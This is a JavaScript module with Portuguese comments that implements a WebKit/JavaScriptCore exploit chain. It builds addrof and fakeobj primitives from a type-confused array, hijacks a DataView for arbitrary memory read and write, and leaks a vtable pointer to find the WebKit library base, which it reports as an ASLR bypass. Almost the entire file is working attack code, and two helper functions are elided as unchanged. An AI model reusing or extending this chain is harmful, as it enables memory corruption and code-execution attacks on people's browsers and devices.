// js/script3/testArrayBufferVictimCrash.mjs (v125 - Arquitetura Final Definitiva)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - ARQUITETURA FINAL: O exploit foi reestruturado para isolar a frágil obtenção do
//   'addrof' em uma função dedicada, protegendo o JIT de interferências.
// - CORRIGIDO: O bug de "stale data" foi corrigido na primitiva de escrita temporária,
//   que agora cria um novo 'leaker' a cada chamada.
// - CADEIA COMPLETA: Esta versão une a obtenção de 'addrof' da v121 com as primitivas
//   robustas de L/E da v122, representando a abordagem mais estável e provável de sucesso.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';
import { triggerOOB_primitive } from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_v125_FinalArchitecture";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) { /* ...código sem alterações... */ }
function doubleToInt64(double) { /* ...código sem alterações... */ }

/**
 * #NOVO: Função de setup isolada para obter as primitivas base.
 */
async function setupJITPrimitives() {
    logS3("--- [SETUP] Iniciando setup isolado de primitivas JIT... ---", "info");
    await triggerOOB_primitive({ force_reinit: true });

    const confused_array = [13.37];
    const victim_array = [{ a: 1 }];
    const addrof = (obj) => {
        victim_array[0] = obj;
        return doubleToInt64(confused_array[0]);
    };
    const fakeobj = (addr) => {
        confused_array[0] = int64ToDouble(addr);
        return victim_array[0];
    };
    
    const sanity_check_addr = addrof({test: 1});
    if (!sanity_check_addr || typeof sanity_check_addr.add !== 'function' || (sanity_check_addr.low() === 0 && sanity_check_addr.high() === 0)) {
         throw new Error("A primitiva 'addrof' falhou no sanity check. A vulnerabilidade JIT não foi ativada.");
    }
    logS3("--- [SETUP] Primitivas JIT obtidas com sucesso. ---", "good");
    return { addrof, fakeobj };
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Arquitetura Final de Exploit ---`, "test");

    let final_result = { success: false, message: "A cadeia de exploração falhou." };

    try {
        // --- FASE 1: Obter primitivas base de forma isolada ---
        logS3("--- FASE 1: Obtendo primitivas 'addrof' e 'fakeobj'... ---", "subtest");
        const { addrof, fakeobj } = await setupJITPrimitives();
        logS3("Primitivas base funcionais e prontas para uso.", "good");

        // --- FASE 2: Construir L/E ROBUSTA via Sequestro de DataView ---
        logS3("--- FASE 2: Construindo L/E arbitrária robusta... ---", "subtest");
        const dv_buf = new ArrayBuffer(8);
        const dataview_tool = new DataView(dv_buf);
        const dataview_addr = addrof(dataview_tool);
        const dv_vector_ptr_addr = dataview_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
        
        // Primitiva de escrita que cria um novo leaker a cada chamada para ser robusta.
        const arb_write_stable = (addr, value) => {
            let fresh_leaker = { p: null, v: 0 };
            fresh_leaker.p = fakeobj(addr);
            fresh_leaker.v = int64ToDouble(value);
        };

        const arb_read = (addr) => {
            arb_write_stable(dv_vector_ptr_addr, addr);
            return doubleToInt64(dataview_tool.getFloat64(0, true));
        };
        const arb_write = (addr, value) => {
            arb_write_stable(dv_vector_ptr_addr, addr);
            dataview_tool.setFloat64(0, int64ToDouble(value), true);
        };
        logS3("Primitivas de L/E robustas construídas com sucesso.", "good");

        // --- FASE 3: Verificação Funcional ---
        logS3("--- FASE 3: Verificando as primitivas de L/E robustas... ---", "subtest");
        const test_obj = { prop_a: 0 };
        const prop_a_addr = addrof(test_obj).add(0x10);
        const value_to_write = new AdvancedInt64(0xABCDEF, 0x123456);
        arb_write(prop_a_addr, value_to_write);
        const value_read = arb_read(prop_a_addr);
        if (!value_read.equals(value_to_write)) {
            throw new Error(`A verificação de L/E ROBUSTA falhou. Escrito: ${toHex(value_to_write)}, Lido: ${toHex(value_read)}`);
        }
        logS3(`[VERIFICAÇÃO] SUCESSO! Valor lido (${toHex(value_read)}) corresponde ao escrito.`, "good");

        // --- FASE 4: Vazamento da Base do WebKit ---
        logS3("--- FASE 4: Tentando vazar a base da biblioteca WebKit... ---", "subtest");
        const div_element = document.createElement('div');
        const vtable_ptr = arb_read(addrof(div_element));
        logS3(`[LEAK] Ponteiro Vtable lido: ${toHex(vtable_ptr)}`, "leak");
        if (vtable_ptr.low() < 0x100000) { // Sanity check para um ponteiro de biblioteca
             throw new Error("Ponteiro da vtable parece inválido (muito baixo).");
        }
        
        const webkit_base = vtable_ptr.and(new AdvancedInt64(0x3FFF, 0).not());
        const elf_magic = arb_read(webkit_base).low();
        logS3(`[LEAK] Base WebKit (candidato): ${toHex(webkit_base)}`, "leak");
        logS3(`[LEAK] Assinatura ELF lida: ${toHex(elf_magic)}`, "leak");

        if (elf_magic === 0x464C457F) {
            logS3("++++++++++++ SUCESSO FINAL! A assinatura ELF foi encontrada! ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: `Bypass de ASLR bem-sucedido. Base do WebKit: ${toHex(webkit_base)}`
            };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic)}`);
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
